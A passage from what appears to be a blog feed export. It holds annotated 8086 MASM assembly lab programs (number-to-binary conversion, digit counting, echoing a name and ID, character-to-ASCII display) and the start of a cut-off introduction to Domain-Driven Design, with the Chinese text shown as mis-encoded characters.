numbers&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    got DB 5 DUP(0)</span><br><span class="line">DATA ENDS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">assume cs:CODE,ds:DATA,ss:_STACK</span><br><span class="line"></span><br><span class="line">START:</span><br><span class="line"></span><br><span class="line">beginofread:</span><br><span class="line">    mov ax,DATA</span><br><span class="line">    mov ds,ax</span><br><span class="line">    ;å–åç§»åœ°å€</span><br><span class="line">    mov dx,offset hello</span><br><span class="line">    ;æ˜¾ç¤ºå­—ç¬¦ä¸²</span><br><span class="line">    mov ah,09H</span><br><span class="line">    int 21H</span><br><span class="line">    ; æ¸…é›¶BX</span><br><span class="line">    mov bx,0H</span><br><span class="line">    ; åˆå§‹åŒ–DIå’ŒCX</span><br><span class="line">    mov di,offset got</span><br><span class="line">    mov cx,0H</span><br><span class="line">readchar:</span><br><span class="line">    ; è¯»å–å­—ç¬¦</span><br><span class="line">    mov ah,01H</span><br><span class="line">    int 21H</span><br><span class="line">    ; æ¯”è¾ƒBXæ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸æ˜¯ï¼Œè·³åˆ°notfirst</span><br><span class="line">    cmp bx,0H</span><br><span class="line">    jne notfirst</span><br><span class="line">    ; æ¯”è¾ƒALæ˜¯å¦ä¸ºQæˆ–qï¼Œå¦‚æœæ˜¯ï¼Œåˆ™é€€å‡ºç¨‹åº</span><br><span class="line">    cmp al,&#x27;Q&#x27;</span><br><span class="line">    je exit</span><br><span class="line">    cmp al,&#x27;q&#x27;</span><br><span class="line">    je exit</span><br><span class="line">    ; æ¯”è¾ƒALæ˜¯å¦ä¸ºsï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿›è¡Œæœç´¢æ“ä½œ</span><br><span class="line">    cmp al,&#x27;s&#x27;</span><br><span class="line">    je counterofnumber</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">notfirst:</span><br><span class="line">;åˆ¤æ–­æ˜¯å¦åˆæ³•</span><br><span class="line">    mov bx,01H</span><br><span class="line">    call legalcheck</span><br><span class="line">;ä¸åˆæ³•é‡æ–°å¼€å§‹</span><br><span class="line">    cmp bx,02H</span><br><span class="line">    je beginofread</span><br><span class="line">;æ¢è¡Œè¾“å…¥ç»“æŸ</span><br><span class="line">    cmp bx,04H</span><br><span class="line">    je endofinput</span><br><span class="line"></span><br><span class="line">    jmp loadinmemory</span><br><span class="line"></span><br><span class="line">loadinmemory:</span><br><span class="line">;è¾“å…¥å­˜å…¥å†…å­˜</span><br><span class="line">    mov [di],al</span><br><span class="line">    inc cx</span><br><span class="line">    inc di</span><br><span class="line">    jmp readchar</span><br><span class="line"></span><br><span class="line">endofinput:</span><br><span class="line">;å–å‰5ä½</span><br><span class="line">    mov dx,0H</span><br><span class="line">    mov di,offset got</span><br><span class="line"></span><br><span class="line">;å°†æ•°å­—è½¬æ¢ä¸ºasciiç </span><br><span class="line">beginofhandle:</span><br><span class="line">    mov bx,0H</span><br><span class="line">    mov bl,[di]</span><br><span class="line">    ; å°†å¯„å­˜å™¨BXä¸­çš„å€¼å‡å»30H</span><br><span class="line">    sub bx,30H  </span><br><span class="line">    add dx,bx</span><br><span class="line">    ;å¤„ç†å®Œæ¯•</span><br><span class="line">    cmp cx,1H</span><br><span class="line">    je endofhandle</span><br><span class="line">    ;axæ¸…é›¶,ä¹˜10</span><br><span class="line">    call mulAHdxtodx</span><br><span class="line">    ;å¾…å¤„ç†å­—ç¬¦å‡ä¸€</span><br><span class="line">    dec cx</span><br><span class="line">    ;ä¸‹ä¸€ä½</span><br><span class="line">    inc di</span><br><span class="line">    jmp beginofhandle</span><br><span class="line"></span><br><span class="line">;è¾“å‡ºASCIIç </span><br><span class="line">endofhandle:</span><br><span class="line">;è¾“å‡º2è¿›åˆ¶</span><br><span class="line">    call binaryoutput</span><br><span class="line">;è·³è½¬é‡æ–°å¼€å§‹</span><br><span class="line">    jmp beginofread</span><br><span class="line"></span><br><span class="line">binaryoutput:</span><br><span class="line">    mov bx,dx</span><br><span class="line">    mov dx,0H</span><br><span class="line">    mov cx,10H ;å¾ªç¯16æ¬¡</span><br><span class="line">    ;å¼€å§‹å¾ªç¯</span><br><span class="line">beginofoutputloop:</span><br><span class="line">;å·¦ç§»1ä½</span><br><span class="line">    shl bx,1</span><br><span class="line">;ä¸è¿›ä½åˆ™è·³è½¬</span><br><span class="line">    jnc out0</span><br><span class="line">    mov dl,&#x27;1&#x27;</span><br><span class="line">    jmp outputdl</span><br><span class="line">out0:</span><br><span class="line">    mov dl,&#x27;0&#x27;</span><br><span class="line">outputdl:</span><br><span class="line">    mov ah,02H</span><br><span class="line">    int 21H</span><br><span class="line">    dec cx ;å¾ªç¯æ¬¡æ•°å‡1</span><br><span class="line">    cmp cx,0H ;åˆ¤æ–­å¾ªç¯æ˜¯å¦ç»“æŸ</span><br><span class="line">    jne beginofoutputloop</span><br><span class="line">    ;ç»“æŸå¾ªç¯,è¾“å‡ºç»“æŸè¯­å¥</span><br><span class="line">    mov dx,offset finish </span><br><span class="line">    mov ah,09H </span><br><span class="line">    int 21H</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">legalcheck:</span><br><span class="line">;åˆ¤æ–­æ¢è¡Œ</span><br><span class="line">    cmp al,0DH</span><br><span class="line">    je endlegalnextline</span><br><span class="line">;åˆ¤æ–­æ•°å­—0-9</span><br><span class="line">    cmp al,30H</span><br><span class="line">    jb endlegalfalse</span><br><span class="line">    cmp al,39H</span><br><span class="line">    ja endlegalfalse</span><br><span class="line"></span><br><span class="line">endlegaltrue:</span><br><span class="line">    mov bx,03H</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">endlegalnextline:</span><br><span class="line">    mov bx,04H</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">endlegalfalse:</span><br><span class="line">;è¾“å‡ºwrongè¯­å¥</span><br><span class="line">    mov dx,offset wrong</span><br><span class="line">    mov ah,09H</span><br><span class="line">    int 21H</span><br><span class="line">;é‡æ–°å¼€å§‹ç¨‹åº</span><br><span class="line">    mov bx,02H</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">mulAHdxtodx:</span><br><span class="line">    mov bx,0H</span><br><span class="line">    mov ax,0H</span><br><span class="line">    </span><br><span class="line">loopofmul:</span><br><span class="line">    add ax,dx</span><br><span class="line">    inc bx</span><br><span class="line">    cmp bx,0AH</span><br><span class="line">    jb loopofmul</span><br><span class="line">    mov dx,ax</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">counterofnumber:</span><br><span class="line">    mov dx,offset hello2</span><br><span class="line">    mov ah,09H</span><br><span class="line">    int 21H</span><br><span class="line">    mov cx,0H</span><br><span class="line">beginofcount:</span><br><span class="line">    mov ah,01H</span><br><span class="line">    int 21H</span><br><span class="line">    ;ç©ºæ ¼å®Œæˆè¾“å…¥</span><br><span class="line">    cmp al,20H</span><br><span class="line">    je endofcount</span><br><span class="line">    cmp al,30H</span><br><span class="line">    jb notnum</span><br><span class="line">    cmp al,39H</span><br><span class="line">    ja notnum</span><br><span class="line">isnum:</span><br><span class="line">    inc cx</span><br><span class="line">    jmp beginofcount</span><br><span class="line">notnum:</span><br><span class="line">    jmp beginofcount</span><br><span class="line">endofcount:</span><br><span class="line">    add cx,30H</span><br><span class="line">    mov dx,offset finish2</span><br><span class="line">    mov ah,09H</span><br><span class="line">    int 21H</span><br><span class="line">    mov dx,0H</span><br><span class="line">    mov dl,cl</span><br><span class="line">    mov ah,02H</span><br><span class="line">    int 21H</span><br><span class="line">    mov dx,offset finish3</span><br><span class="line">    mov ah,09H</span><br><span class="line">    int 21H</span><br><span class="line">    ;è·³å›å¼€å§‹ä½ç½®</span><br><span class="line">    jmp beginofread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">    mov ah,4CH</span><br><span class="line">    int 21H</span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œç»“æœ:</strong><br><img src="https://pb01.s3.bitiful.net/35.png" alt="avatar"></p>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸€(è¯¦ç»†æ³¨é‡Šç‰ˆ)</title>
      <link href="/2023/12/02/2023-12-2-%E5%BE%AE%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C1/"/>
      <url>/2023/12/02/2023-12-2-%E5%BE%AE%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C1/</url>
      
        <content type="html"><![CDATA[<h3 id="è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸€-è¯¦ç»†æ³¨é‡Šç‰ˆ"><a href="#è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸€-è¯¦ç»†æ³¨é‡Šç‰ˆ" class="headerlink" title="è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸€(è¯¦ç»†æ³¨é‡Šç‰ˆ)"></a>è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸€(è¯¦ç»†æ³¨é‡Šç‰ˆ)</h3><p><strong>ç¯å¢ƒ</strong>:VSCode+MASM/TASMæ’ä»¶(å»ºè®®ä½¿ç”¨ç›¸åŒç¯å¢ƒ,å­¦æ ¡æœºæˆ¿ç¯å¢ƒæœ‰ç‚¹è€,å¯èƒ½ä¼šå‡ºä¸€äº›å¥‡æ€ªçš„é—®é¢˜)</p><p><img src="https://pb01.s3.bitiful.net/32.png" alt="avatar"></p><h4 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h4><ol><li>æ‰“å°Hello World!</li><li>æ‰“å°è¾“å…¥çš„å§“å</li><li>æ‰“å°è¾“å…¥çš„id</li><li>å°†è¾“å…¥çš„å­—ç¬¦è½¬æ¢æˆASCIIç </li><li>è¾“å…¥qæˆ–Qé€€å‡ºç¨‹åº</li></ol><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">stack segment</span><br><span class="line">    db 128 dup(0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">   msg1 db &#x27;hello world!$&#x27;       ; å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºâ€œhello world!â€</span><br><span class="line">   msg2 db &#x27;please input your name:$&#x27;  ; å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæç¤ºè¾“å…¥åå­—</span><br><span class="line">   msg3 db &#x27;please input your id:$&#x27;    ; å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæç¤ºè¾“å…¥ID</span><br><span class="line">   msg4 db &#x27;please input a char:$&#x27;    ; å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæç¤ºè¾“å…¥ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">   buffer db &#x27;$&#x27;                  ; å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºç©ºå­—ç¬¦ä¸² </span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">assume cs:code,ds:data</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">; å°†æ•°æ®æ®µåœ°å€èµ‹å€¼ç»™AX</span><br><span class="line">    mov ax,data</span><br><span class="line">    ; å°†AXçš„å€¼èµ‹å€¼ç»™DS</span><br><span class="line">    mov ds,ax</span><br><span class="line">    ; å°†AXçš„å€¼èµ‹å€¼ç»™ES</span><br><span class="line">    mov es,ax</span><br><span class="line"></span><br><span class="line">; æ˜¾ç¤ºâ€œhello world!â€å­—ç¬¦ä¸²</span><br><span class="line">    lea dx, msg1</span><br><span class="line">    mov ah, 9</span><br><span class="line">    int 21h  ;ä¸­æ–­è°ƒç”¨æŒ‡ä»¤</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">; å›è½¦æ¢è¡Œ</span><br><span class="line">    mov dl, 0Dh  </span><br><span class="line">    mov ah, 2  </span><br><span class="line">    int 21h</span><br><span class="line">mov dl, 0Ah</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">; æç¤ºè¾“å…¥åå­—</span><br><span class="line">    lea dx, msg2</span><br><span class="line">    mov ah, 9</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ; è¾“å…¥åå­—</span><br><span class="line">    lea dx, buffer</span><br><span class="line">    mov ah, 0Ah</span><br><span class="line">    mov al, 00h</span><br><span class="line">    int 21h</span><br><span class="line">    ; æ¸…ç©ºç¼“å†²åŒº</span><br><span class="line">    xor bx,bx</span><br><span class="line">mov bl,buffer[1]</span><br><span class="line">mov buffer[bx+2],&#x27;$&#x27;</span><br><span class="line"></span><br><span class="line">    ;æ¢è¡Œ</span><br><span class="line">mov dl,0Dh</span><br><span class="line">mov ah,2</span><br><span class="line">int 21h</span><br><span class="line">mov dl,0Ah</span><br><span class="line">mov ah,2</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">;è¾“å‡ºå§“å</span><br><span class="line">lea dx, offset [buffer+2]      </span><br><span class="line">    mov ah, 09h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">;æ¢è¡Œ</span><br><span class="line">mov dl,0Dh</span><br><span class="line">mov ah,2</span><br><span class="line">int 21h</span><br><span class="line">mov dl,0Ah</span><br><span class="line">mov ah,2</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; æç¤ºè¾“å…¥ID</span><br><span class="line">lea dx, msg3</span><br><span class="line">mov ah,9</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">; æç¤ºè¾“å…¥IDçš„åç»­æ“ä½œ</span><br><span class="line">lea dx,buffer</span><br><span class="line">mov ah,0Ah</span><br><span class="line">mov al,00h</span><br><span class="line">int 21h</span><br><span class="line"> </span><br><span class="line">;æ¸…ç©ºç¼“å†²åŒº</span><br><span class="line">xor bx,bx</span><br><span class="line">mov bl,buffer[1]</span><br><span class="line">mov buffer[bx+2],&#x27;$&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;æ¢è¡Œ</span><br><span class="line">mov dl,0Dh</span><br><span class="line">mov ah,2</span><br><span class="line">int 21h</span><br><span class="line">mov dl,0Ah</span><br><span class="line">mov ah,2</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">; æ˜¾ç¤ºID</span><br><span class="line">lea dx, offset [buffer+2]      </span><br><span class="line">    mov ah, 09h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmpq:</span><br><span class="line">mov dl, 0Dh</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">    mov dl, 0Ah</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">; æ˜¾ç¤ºæç¤ºè¾“å…¥å­—ç¬¦çš„å­—ç¬¦ä¸²</span><br><span class="line">lea dx,msg4</span><br><span class="line">mov ah,9</span><br><span class="line">int 21h</span><br><span class="line">    </span><br><span class="line">    mov dl, 0Dh</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">    mov dl, 0Ah</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">;è¾“å…¥ä¸€ä¸ªå­—ç¬¦å¹¶å›æ˜¾</span><br><span class="line">    mov ah, 1</span><br><span class="line">    int 21h ;æ‰§è¡Œä¸­æ–­1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cmp al, &#x27;q&#x27;</span><br><span class="line">    ;è‹¥ç­‰äºqï¼Œåˆ™è·³è½¬åˆ°ending</span><br><span class="line">    je ending</span><br><span class="line">    cmp al, &#x27;Q&#x27;</span><br><span class="line">    ;è‹¥ç­‰äºQï¼Œåˆ™è·³è½¬åˆ°ending</span><br><span class="line">    je ending</span><br><span class="line">;ä½å…«ä½å­˜å…¥bl</span><br><span class="line">    mov bl, al</span><br><span class="line">;é«˜å…«ä½å­˜å…¥bh</span><br><span class="line">    mov bh, al</span><br><span class="line">    ;å›è½¦+æ¢è¡Œ</span><br><span class="line">    mov dl, 0Dh</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">    mov dl, bh</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">    mov dl, 9</span><br><span class="line">    mov ah, 2</span><br><span class="line">    and bl, 0F0h  ;å–blé«˜å››ä½</span><br><span class="line">    mov cl, 4  </span><br><span class="line">;å³ç§»4ä½,é«˜4ä½å˜ä¸ºä½4ä½</span><br><span class="line">    shr bl, cl</span><br><span class="line">    cmp bl, 9</span><br><span class="line">    ja alph1</span><br><span class="line">;å¤„ç†æ•°å­—</span><br><span class="line">numb1:</span><br><span class="line">;è½¬æ¢ä¸ºasciiç </span><br><span class="line">    add bl, &#x27;0&#x27;</span><br><span class="line">    mov dl, bl</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h ;æ‰§è¡Œ2å·ä¸­æ–­,æ˜¾ç¤ºè¾“å‡º</span><br><span class="line">    jmp low4</span><br><span class="line">alph1:</span><br><span class="line">;è½¬æ¢ä¸ºasciiç </span><br><span class="line">    add bl, 37h</span><br><span class="line">    mov dl, bl</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">low4:</span><br><span class="line">    and bh, 0Fh  ;å–ä½å››ä½</span><br><span class="line">    cmp bh, 9</span><br><span class="line">    ja alph2</span><br><span class="line">numb2:</span><br><span class="line">    add bh, &#x27;0&#x27;  ;åŠ 0</span><br><span class="line">    mov dl, bh</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">    jmp cmpq</span><br><span class="line">alph2:</span><br><span class="line">    add bh, 37h ;åŠ A</span><br><span class="line">    mov dl, bh</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h </span><br><span class="line">    jmp cmpq</span><br><span class="line">ending:</span><br><span class="line">    ;å›è½¦+æ¢è¡Œ</span><br><span class="line">    mov dl, 0Dh</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">    mov dl, 0Ah</span><br><span class="line">    mov ah, 2</span><br><span class="line">    int 21h</span><br><span class="line">    ;ç»ˆæ­¢ç¨‹åº</span><br><span class="line">    mov ax, 4c00h</span><br><span class="line">    int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h4 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a>è¿è¡Œç»“æœ</h4><p><img src="https://pb01.s3.bitiful.net/33.png" alt="avatar"></p>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDDæ˜¯ä»€ä¹ˆï¼Ÿ</title>
      <link href="/2023/12/01/2023-12-1-DDD%E6%9E%B6%E6%9E%84-1/"/>
      <url>/2023/12/01/2023-12-1-DDD%E6%9E%B6%E6%9E%84-1/</url>
      
        <content type="html"><![CDATA[<h2 id="DDDæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#DDDæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="DDDæ˜¯ä»€ä¹ˆï¼Ÿ"></a>DDDæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>DDD æ˜¯é¢†åŸŸé©±åŠ¨è®¾è®¡ï¼ˆDomain-Driven Designï¼‰çš„ç¼©å†™ï¼Œè¿™æ˜¯ä¸€ç§ä¸»è¦è½¯ä»¶å¼€å‘æ–¹æ³•ï¼Œç”± Eric Evans åœ¨ä»–çš„ä¹¦ã€Šé¢†åŸŸé©±åŠ¨è®¾è®¡ï¼šè½¯ä»¶æ ¸å¿ƒå¤æ‚æ€§åº”å¯¹ä¹‹é“ã€‹ï¼ˆDomain-Driven Design: Tackling Complexity in the Heart of Softwareï¼‰ä¸­é¦–æ¬¡æå‡ºã€‚</p><p>DDD ä¸»è¦å…³æ³¨äºåˆ›å»ºä¸ä¸šåŠ¡é¢†åŸŸç´§å¯†ç›¸å…³çš„è½¯ä»¶æ¨¡å‹ï¼Œä»¥ç¡®ä¿è½¯ä»¶èƒ½å¤Ÿå‡†ç¡®åœ°è§£å†³å®é™…é—®é¢˜ã€‚</p><p>DDD çš„æ ¸å¿ƒç†å¿µåŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p><ol><li><p><strong>é¢†åŸŸæ¨¡å‹ï¼ˆDomain Modelï¼‰ï¼š</strong><br>é¢†åŸŸæ¨¡å‹æ˜¯å¯¹ç‰¹å®šä¸šåŠ¡é¢†åŸŸçŸ¥è¯†çš„ç²¾ç¡®è¡¨è¿°ï¼Œå®ƒåŒ…æ‹¬ä¸šåŠ¡ä¸­çš„å®ä½“ï¼ˆEntitiesï¼‰ã€å€¼å¯¹è±¡ï¼ˆValue Objectsï¼‰ã€æœåŠ¡ï¼ˆServicesï¼‰ã€èšåˆï¼ˆAggregatesï¼‰ã€èšåˆæ ¹ï¼ˆAggregate Rootsï¼‰ç­‰æ¦‚å¿µã€‚é¢†åŸŸæ¨¡å‹æ˜¯DDDçš„æ ¸å¿ƒï¼Œå®ƒåæ˜ äº†ä¸šåŠ¡ä¸“å®¶çš„è¯­è¨€å’Œå†³ç­–ã€‚</p></li><li><p><strong>ç»Ÿä¸€è¯­è¨€ï¼ˆUbiquitous Languageï¼‰ï¼š</strong><br>ç»Ÿä¸€è¯­è¨€æ˜¯å¼€å‘å›¢é˜Ÿä¸ä¸šåŠ¡ä¸“å®¶å…±åŒä½¿ç”¨çš„è¯­è¨€ï¼Œå®ƒåœ¨æ•´ä¸ªé¡¹ç›®ä¸­ä¿æŒä¸€è‡´ã€‚ç»Ÿä¸€è¯­è¨€ç¡®ä¿æ‰€æœ‰äººéƒ½å¯¹ä¸šåŠ¡æ¦‚å¿µæœ‰ç€ç›¸åŒçš„ç†è§£ï¼Œå‡å°‘æ²Ÿé€šæˆæœ¬å’Œè¯¯è§£ã€‚</p></li><li><p><strong>é™ç•Œä¸Šä¸‹æ–‡ï¼ˆBounded Contextï¼‰ï¼š</strong><br>é™ç•Œä¸Šä¸‹æ–‡æ˜¯æ˜ç¡®ç•Œå®šçš„ç³»ç»Ÿè¾¹ç•Œï¼Œåœ¨è¿™ä¸ªè¾¹ç•Œå†…éƒ¨æœ‰ä¸€å¥—ç»Ÿä¸€çš„æ¨¡å‹å’Œè¯­è¨€ã€‚ä¸åŒçš„é™ç•Œä¸Šä¸‹æ–‡ä¹‹é—´å¯èƒ½æœ‰ä¸åŒçš„æ¨¡å‹ï¼Œå®ƒä»¬é€šè¿‡ä¸Šä¸‹æ–‡æ˜ å°„ï¼ˆContext Mappingï¼‰æ¥è¿›è¡Œäº¤äº’å’Œé›†æˆã€‚</p></li><li><p><strong>èšåˆï¼ˆAggregateï¼‰ï¼š</strong><br>èšåˆæ˜¯ä¸€ç»„ç›¸å…³å¯¹è±¡çš„é›†åˆï¼Œå®ƒä»¬è¢«è§†ä¸ºæ•°æ®ä¿®æ”¹çš„å•å…ƒã€‚æ¯ä¸ªèšåˆéƒ½æœ‰ä¸€ä¸ªèšåˆæ ¹ï¼Œå®ƒæ˜¯å¤–éƒ¨å¯¹è±¡ä¸èšåˆå†…éƒ¨å¯¹è±¡äº¤äº’çš„å”¯ä¸€å…¥å£ã€‚</p></li><li><p><strong>é¢†åŸŸæœåŠ¡ï¼ˆDomain Servicesï¼‰ï¼š</strong><br>å½“æŸäº›è¡Œä¸ºä¸è‡ªç„¶å±äºä»»ä½•å®ä½“æˆ–å€¼å¯¹è±¡æ—¶ï¼Œè¿™äº›è¡Œä¸ºå¯ä»¥è¢«å®šä¹‰ä¸ºé¢†åŸŸæœåŠ¡ã€‚é¢†åŸŸæœåŠ¡é€šå¸¸è¡¨ç¤ºé¢†åŸŸä¸­çš„ä¸€äº›æ“ä½œæˆ–ä¸šåŠ¡é€»è¾‘ã€‚</p></li><li><p><strong>åº”ç”¨æœåŠ¡ï¼ˆApplication 